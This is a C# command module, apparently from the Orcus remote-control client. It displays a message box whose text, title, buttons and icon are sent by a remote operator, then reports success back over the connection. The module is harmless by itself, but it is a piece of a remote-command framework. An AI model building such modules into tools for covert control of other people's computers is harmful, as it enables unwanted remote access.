using System.Windows.Forms;
using Orcus.Plugins;
using Orcus.Shared.Commands.MessageBox;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.MessageBox
{
    internal class MessageBoxCommand : Command
    {
        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            var serializer = new Serializer(typeof (MessageBoxInformation));
            var info = serializer.Deserialize<MessageBoxInformation>(parameter);

            System.Windows.Forms.MessageBox.Show(info.Text, info.Title,
                (System.Windows.Forms.MessageBoxButtons) info.MessageBoxButtons, SystemIconToMessageBoxIcon(info.Icon));

            connectionInfo.CommandSucceed(this, new byte[0]);
        }

        private static MessageBoxIcon SystemIconToMessageBoxIcon(SystemIcon icon)
        {
            switch (icon)
            {
                case SystemIcon.Error:
                    return MessageBoxIcon.Error;
                case SystemIcon.Info:
                    return MessageBoxIcon.Information;
                case SystemIcon.Warning:
                    return MessageBoxIcon.Warning;
                case SystemIcon.Question:
                    return MessageBoxIcon.Question;
                default:
                    return MessageBoxIcon.None;
            }
        }

        protected override uint GetId()
        {
            return 11;
        }
    }
}